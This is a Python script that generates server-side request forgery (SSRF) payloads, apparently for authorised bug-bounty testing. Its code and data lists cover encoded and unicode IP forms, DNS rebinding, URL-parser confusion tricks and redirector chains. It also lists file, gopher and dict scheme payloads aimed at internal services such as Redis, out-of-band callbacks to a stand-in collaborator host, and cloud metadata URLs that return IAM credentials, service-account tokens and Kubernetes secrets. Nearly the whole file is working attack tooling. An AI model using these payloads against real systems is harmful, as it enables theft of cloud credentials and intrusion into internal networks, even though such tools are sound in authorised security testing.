#!/usr/bin/env python3
"""SSRF payload generator (offline). Also imported by ssrf_probe.py.

Usage:
  ssrf_payloads.py --target 127.0.0.1[:port][/path] [--allowed-host cdn.example.com] [--collab YOU.oast.fun]
                   [--redirector https://you.example/r] [--rebind-from 1.2.3.4]
                   [--families ip,ipv6,unicode,dns,rebind,parser,scheme,redirect,metadata,all] [--cloud aws,gcp,...]
                   [--include-sensitive] [--percent-unicode]

Output TSV: family, class, note, payload.
Classes: O out-of-band to YOUR host | R internal reach / benign proof | S sensitive (credentials, user-data,
tokens, secret files - needs explicit permission) | W talks to an internal non-HTTP service (gated).
Sensitive metadata paths are listed only with --include-sensitive, and are labelled S.
"""
import argparse
import base64
import ipaddress
import sys
from urllib.parse import quote

CIRCLED = {str(i): chr(0x2460 + i - 1) for i in range(1, 10)} | {"0": chr(0x24EA)}
FULLWIDTH = {str(i): chr(0xFF10 + i) for i in range(10)}
DOTS = {"ideographic": chr(0x3002), "fullwidth": chr(0xFF0E), "halfwidth-ideographic": chr(0xFF61)}

METADATA = [  # cloud, class, header needed, url
    ("aws", "R", "", "http://169.254.169.254/latest/meta-data/"),
    ("aws", "R", "", "http://169.254.169.254/latest/meta-data/instance-id"),
    ("aws", "R", "", "http://169.254.169.254/latest/meta-data/ami-id"),
    ("aws", "R", "", "http://169.254.169.254/latest/meta-data/hostname"),
    ("aws", "R", "", "http://169.254.169.254/latest/meta-data/iam/info"),
    ("aws", "R", "role name only", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws", "S", "", "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"),
    ("aws", "S", "", "http://169.254.169.254/latest/user-data"),
    ("aws", "S", "", "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"),
    ("aws", "R", "IMDSv2 needs PUT /latest/api/token + X-aws-ec2-metadata-token", "http://169.254.169.254/latest/api/token"),
    ("aws-ecs", "R", "", "http://169.254.170.2/v4/"),
    ("aws-ecs", "S", "path from AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "http://169.254.170.2/v2/credentials/GUID"),
    ("aws-lambda", "S", "event data of the running invocation", "http://localhost:9001/2018-06-01/runtime/invocation/next"),
    ("gcp", "R", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/id"),
    ("gcp", "R", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
    ("gcp", "R", "Metadata-Flavor: Google", "http://169.254.169.254/computeMetadata/v1/instance/hostname"),
    ("gcp", "R", "legacy, no header (mostly disabled)", "http://metadata.google.internal/computeMetadata/v1beta1/instance/id"),
    ("gcp", "S", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("gcp", "S", "legacy recursive dump", "http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true"),
    ("azure", "R", "Metadata: true", "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text"),
    ("azure", "S", "Metadata: true", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ("digitalocean", "R", "", "http://169.254.169.254/metadata/v1/id"),
    ("digitalocean", "S", "", "http://169.254.169.254/metadata/v1/user-data"),
    ("oracle", "R", "Authorization: Bearer Oracle (IMDSv2)", "http://169.254.169.254/opc/v2/instance/id"),
    ("oracle", "R", "legacy", "http://192.0.0.192/latest/meta-data/"),
    ("alibaba", "R", "", "http://100.100.100.200/latest/meta-data/instance-id"),
    ("alibaba", "S", "", "http://100.100.100.200/latest/meta-data/ram/security-credentials/"),
    ("openstack", "R", "", "http://169.254.169.254/openstack/latest/meta_data.json"),
    ("hetzner", "R", "", "http://169.254.169.254/hetzner/v1/metadata/instance-id"),
    ("tencent", "R", "", "http://metadata.tencentyun.com/latest/meta-data/instance-id"),
    ("packet", "R", "", "https://metadata.packet.net/metadata"),
    ("kubernetes", "R", "unauthenticated reachability only", "https://kubernetes.default.svc/version"),
    ("kubernetes", "R", "", "https://kubernetes.default.svc/metrics"),
    ("kubernetes", "S", "", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"),
    ("kubelet", "R", "", "https://127.0.0.1:10250/pods"),
    ("kubelet", "R", "read-only port (old clusters)", "http://127.0.0.1:10255/pods"),
    ("etcd", "R", "", "http://127.0.0.1:2379/version"),
    ("docker", "R", "", "http://127.0.0.1:2375/version"),
    ("consul", "R", "", "http://127.0.0.1:8500/v1/agent/self"),
]


def ip_forms(ip):
    a, b, c, d = (int(x) for x in ip.split("."))
    n = (a << 24) | (b << 16) | (c << 8) | d
    out = [("dotted", ip), ("decimal", str(n)), ("hex", f"0x{n:08x}"), ("hex-short", hex(n)),
           ("octal", f"0{n:o}"), ("octal-padded", f"00000{n:o}"),
           ("dotted-hex", ".".join(f"0x{x:x}" for x in (a, b, c, d))),
           ("dotted-hex-padded", ".".join(f"0x{x:08x}" for x in (a, b, c, d))),
           ("dotted-octal", ".".join(f"0{x:o}" for x in (a, b, c, d))),
           ("dotted-octal-padded", ".".join(f"{x:04o}" if x else "0000" for x in (a, b, c, d))),
           ("first-octet-octal", f"0{a:o}.{b}.{c}.{d}"), ("first-octet-hex", f"0x{a:x}.{b}.{c}.{d}"),
           ("mixed", f"0x{a:x}.0{b:o}.{c}.0x{d:x}"),
           ("three-part", f"{a}.{b}.{(c << 8) | d}"), ("two-part", f"{a}.{(b << 16) | (c << 8) | d}"),
           ("zero-padded", f"{a}.{b:03d}.{c:03d}.{d:03d}"), ("long-zero", f"{a}.000000000000{b}.{c}.{d}" if b == 0 else f"{a}.{b}.{c}.{d}"),
           ("overflow-legacy", f"{a + 256}.{b + 256}.{c + 256}.{d + 256}")]
    if ip == "127.0.0.1":
        out += [("short", "127.1"), ("short3", "127.0.1"), ("zero", "0"), ("any", "0.0.0.0"), ("loopback-other", "127.127.127.127"),
                ("loopback-other", "127.0.1.3"), ("name", "localhost"), ("name-trailing-dot", "localhost.")]
    return out


def ipv6_forms(ip):
    a, b, c, d = (int(x) for x in ip.split("."))
    h1, h2 = f"{(a << 8) | b:x}", f"{(c << 8) | d:x}"
    out = [("v4-mapped", f"[::ffff:{ip}]"), ("v4-mapped-hex", f"[::ffff:{h1}:{h2}]"),
           ("v4-mapped-expanded", f"[0:0:0:0:0:ffff:{h1}:{h2}]"), ("v4-compat", f"[::{ip}]"),
           ("v4-mapped-zone", f"[::ffff:{h1}:{h2}%25eth0]"), ("nat64", f"[64:ff9b::{ip}]")]
    if ip == "127.0.0.1":
        out += [("loopback", "[::1]"), ("loopback-long", "[0000::1]"), ("loopback-expanded", "[0:0:0:0:0:0:0:1]"),
                ("unspecified", "[::]")]
    return out


def unicode_forms(ip, percent=False):
    out = []
    for name, dot in DOTS.items():
        out.append((f"dot-{name}", ip.replace(".", dot)))
    out.append(("circled-digits", "".join(CIRCLED.get(ch, ch) for ch in ip)))
    out.append(("fullwidth-digits", "".join(FULLWIDTH.get(ch, ch) for ch in ip)))
    out.append(("circled+ideographic-dot", "".join(CIRCLED.get(ch, ch) for ch in ip).replace(".", DOTS["ideographic"])))
    if percent:
        out = [(n, quote(p, safe=".")) for n, p in out]
    return out


def build(target="127.0.0.1", allowed=None, collab=None, redirector=None, rebind_from=None, families=None,
          clouds=None, include_sensitive=False, percent=False):
    fam = set(families or ["ip", "ipv6", "unicode", "dns", "parser", "scheme", "redirect", "metadata"])
    if "all" in fam:
        fam = {"ip", "ipv6", "unicode", "dns", "rebind", "parser", "scheme", "redirect", "metadata"}
    host, _, rest = target.partition("/")
    hostname, _, port = host.partition(":")
    path = "/" + rest if rest else "/"
    pp = f":{port}" if port else ""
    out = []
    add = lambda f, cls, note, p: out.append(dict(family=f, cls=cls, note=note, payload=p))
    try:
        ipaddress.IPv4Address(hostname)
        is_ip = True
    except ValueError:
        is_ip = False
    if is_ip:
        if "ip" in fam:
            for n, h in ip_forms(hostname):
                add("ip", "R", n, f"http://{h}{pp}{path}")
        if "ipv6" in fam:
            for n, h in ipv6_forms(hostname):
                add("ipv6", "R", n, f"http://{h}{pp}{path}")
        if "unicode" in fam:
            for n, h in unicode_forms(hostname, percent):
                add("unicode", "R", n, f"http://{h}{pp}{path}")
            add("unicode", "R", "ipv6+unicode", f"http://[::{chr(0x24D5) * 4}:{''.join(CIRCLED.get(ch, ch) for ch in hostname).replace('.', DOTS['ideographic'])}]{pp}{path}")
        if "dns" in fam:
            dash = hostname.replace(".", "-")
            add("dns", "R", "nip.io (third-party wildcard DNS)", f"http://{hostname}.nip.io{pp}{path}")
            add("dns", "R", "sslip.io", f"http://{dash}.sslip.io{pp}{path}")
            add("dns", "R", "1u.ms static A", f"http://make-{dash}-rr.1u.ms{pp}{path}")
            if hostname == "127.0.0.1":
                add("dns", "R", "localtest.me", f"http://localtest.me{pp}{path}")
                add("dns", "R", "own domain", f"http://localhost.YOUR-DOMAIN{pp}{path}   # A record -> 127.0.0.1 you control")
        if "rebind" in fam:
            src = rebind_from or "PUBLIC_IP_ALLOWED_BY_FILTER"
            add("rebind", "R", "1u.ms: 1st answer public, 2nd internal", f"http://make-{src.replace('.', '-')}-rebind-{hostname.replace('.', '-')}-rr.1u.ms{pp}{path}")
            if rebind_from:
                hx = lambda x: "".join(f"{int(o):02x}" for o in x.split("."))
                add("rebind", "R", "rbndr.us: random alternation", f"http://{hx(rebind_from)}.{hx(hostname)}.rbndr.us{pp}{path}")
            add("rebind", "R", "two A records (same answer, client picks)", f"http://make-{src.replace('.', '-')}-and-{hostname.replace('.', '-')}-rr.1u.ms{pp}{path}")
    T = f"{hostname}{pp}"
    if "parser" in fam:
        A = allowed or "ALLOWED.example.com"
        for note, p in (("userinfo", f"http://{A}@{T}{path}"), ("userinfo+port", f"http://{A}:80@{T}{path}"),
                        ("fragment", f"http://{T}#@{A}/"), ("encoded-fragment", f"http://{T}%23@{A}/"),
                        ("hash-only", f"http://{T}#{A}"), ("query", f"http://{T}?{A}"), ("query-param", f"http://{T}/?d={A}"),
                        ("path", f"http://{T}/{A}"), ("null", f"http://{T}%00{A}"), ("tab", f"http://{T}%09{A}"),
                        ("triple-slash", f"http://{T}///{A}"), ("backslash-at", f"http://{T}\\@{A}/"),
                        ("double-at", f"http://foo@{T}:80@{A}/"), ("space-at", f"http://foo@{T}%20@{A}/"),
                        ("backslash-double-at", f"http://{T}:80\\@@{A}/"), ("colon-backslash", f"http://{T}:80:\\@@{A}/"),
                        ("hash-backslash", f"http://{T}:80#\\@{A}/"), ("multi-host", f"http://{T} &@{A}# @{A}/"),
                        ("allowed-in-query", f"http://{T}{path}?http://{A}/"), ("subdomain-of-target", f"http://{A}.{T}/"),
                        ("scheme-relative", f"//{T}{path}"), ("missing-slashes", f"http:{T}{path}"),
                        ("one-slash", f"http:/{T}{path}"), ("backslashes", f"http:\\\\{T}{path}"),
                        ("mixed-slashes", f"http:/\\/\\{T}{path}"), ("leading-crlf", f"%0D%0A/{T}"),
                        ("unicode-slash", f"http://{A}\u2044{T}"), ("hpp", f"url={A}&url=http://{T}{path}"),
                        ("credentials", f"http://user:pass@{T}{path}"), ("upper-scheme", f"HTTP://{T}{path}"),
                        ("https-downgrade", f"http://{T}:443{path}"), ("http-on-https-port", f"https://{T}:80{path}")):
            add("parser", "R", note, p)
        add("parser", "R", "appended suffix killer", f"http://{T}{path}#")
        add("parser", "R", "appended suffix killer", f"http://{T}{path}?")
        add("parser", "R", "server prefixes its own host: inject userinfo", f"@{T}{path}")
        add("parser", "R", "server prefixes its own host: path trick", f"/%2F//{T}{path}")
    if "scheme" in fam:
        C = collab or "YOUR.COLLAB"
        for note, cls, p in (("file", "R", "file:///etc/hostname"), ("file", "R", "file:///etc/passwd"),
                             ("file slash trick", "R", "file://\\/\\/etc/passwd"), ("file no slashes", "R", "file:/etc/passwd?/"),
                             ("file dotdot", "R", "file:///etc/?/../passwd"), ("file localhost", "R", "file://localhost/etc/passwd"),
                             ("file windows", "R", "file:///C:/Windows/win.ini"), ("java url:", "R", "url:file:///etc/passwd"),
                             ("java netdoc", "R", "netdoc:///etc/passwd"), ("java jar (fetches remote zip)", "O", f"jar:http://{C}/bbtest.zip!/x"),
                             ("node-windows single-letter scheme", "R", "l://etc/passwd"),
                             ("gopher to your host", "O", f"gopher://{C}:80/_bbtest%0d%0a"), ("dict to your host", "O", f"dict://{C}:11111/bbtest"),
                             ("ftp to your host", "O", f"ftp://{C}/bbtest"), ("sftp to your host", "O", f"sftp://{C}:11111/"),
                             ("tftp to your host", "O", f"tftp://{C}:12346/BBTEST"), ("ldap to your host", "O", f"ldap://{C}:389/bbtest"),
                             ("UNC (Windows; DNS/SMB to your host)", "O", f"\\\\{C}\\bbtest"),
                             ("dict internal redis INFO (gated)", "W", "dict://127.0.0.1:6379/info"),
                             ("gopher internal (gated, report-only)", "W", "gopher://127.0.0.1:6379/_INFO%0d%0a"),
                             ("sensitive file (gated)", "S", "file:///proc/self/environ"),
                             ("sensitive file (gated)", "S", "file:///var/run/secrets/kubernetes.io/serviceaccount/token")):
            if cls == "S" and not include_sensitive:
                continue
            add("scheme", cls, note, p)
    if "redirect" in fam:
        R = redirector or "https://YOUR-REDIRECTOR/r"
        tgt = f"http://{T}{path}"
        for code in (301, 302, 303, 307, 308):
            add("redirect", "R", f"your redirector {code}", f"{R}?to={quote(tgt, safe='')}&code={code}")
        b64 = base64.urlsafe_b64encode(tgt.encode()).decode().rstrip("=")
        add("redirect", "R", "your redirector, base64 target (hides it from substring filters)", f"{R}?b64={b64}&code=302")
        add("redirect", "R", "redirect to other scheme", f"{R}?to={quote('file:///etc/hostname', safe='')}&code=302")
        add("redirect", "R", "TOCTOU: valid image first, redirect on refetch", f"{R.rsplit('/', 1)[0]}/toctou?to={quote(tgt, safe='')}")
        add("redirect", "R", "target's own open redirect", f"https://TARGET/OPEN-REDIRECT?next={quote(tgt, safe='')}")
    if "metadata" in fam:
        for cloud, cls, note, url in METADATA:
            if clouds and cloud.split("-")[0] not in clouds:
                continue
            if cls == "S" and not include_sensitive:
                continue
            add("metadata", cls, f"{cloud}{': ' + note if note else ''}", url)
        for n, h in ip_forms("169.254.169.254")[1:8] + ipv6_forms("169.254.169.254")[:3]:
            add("metadata-encoded", "R", n, f"http://{h}/latest/meta-data/instance-id")
        add("metadata-encoded", "R", "nip.io", "http://169.254.169.254.nip.io/latest/meta-data/instance-id")
        add("metadata-encoded", "R", "ipv6+unicode (WAF bypass)",
            f"http://[::{chr(0x24D5) * 4}:{''.join(CIRCLED.get(ch, ch) for ch in '169.254.169.254').replace('.', DOTS['ideographic'])}]:80/latest/meta-data/instance-id")
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="127.0.0.1")
    ap.add_argument("--allowed-host")
    ap.add_argument("--collab")
    ap.add_argument("--redirector")
    ap.add_argument("--rebind-from")
    ap.add_argument("--families", default="ip,ipv6,unicode,dns,parser,scheme,redirect,metadata")
    ap.add_argument("--cloud")
    ap.add_argument("--include-sensitive", action="store_true")
    ap.add_argument("--percent-unicode", action="store_true", help="percent-encode non-ASCII forms (UTF-8)")
    a = ap.parse_args()
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except AttributeError:
        pass
    rows = build(a.target, a.allowed_host, a.collab, a.redirector, a.rebind_from,
                 [f.strip() for f in a.families.split(",")], [c.strip() for c in a.cloud.split(",")] if a.cloud else None,
                 a.include_sensitive, a.percent_unicode)
    print("family\tclass\tnote\tpayload")
    seen = set()
    for r in rows:
        if r["payload"] in seen:
            continue
        seen.add(r["payload"])
        print(f"{r['family']}\t{r['cls']}\t{r['note']}\t{r['payload']}")


if __name__ == "__main__":
    main()
